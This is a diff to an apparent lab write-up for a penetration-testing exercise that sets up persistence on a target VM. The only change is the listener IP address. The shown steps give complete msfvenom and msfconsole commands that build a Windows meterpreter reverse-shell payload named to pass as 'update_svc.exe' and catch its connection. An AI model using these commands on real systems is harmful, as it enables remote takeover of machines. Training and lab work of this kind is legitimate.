@@ -22,14 +22,14 @@ Establish a form of persistence on the target VM to allow for future attacks.
 
 ## Attack Execution
 1. Use MSFvenom to generate a payload
-   - ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.20.X LPORT=4444 -f exe -o ~/lab/payloads/update_svc.exe```
+   - ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.X LPORT=4444 -f exe -o ~/lab/payloads/update_svc.exe```
 2. Drag payload into shared drive between Windows and Kali
 3. Establish a listener on Kali
 ```
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 10.10.20.X
+set LHOST 10.10.10.X
 set LPORT 4444
 run
 ```
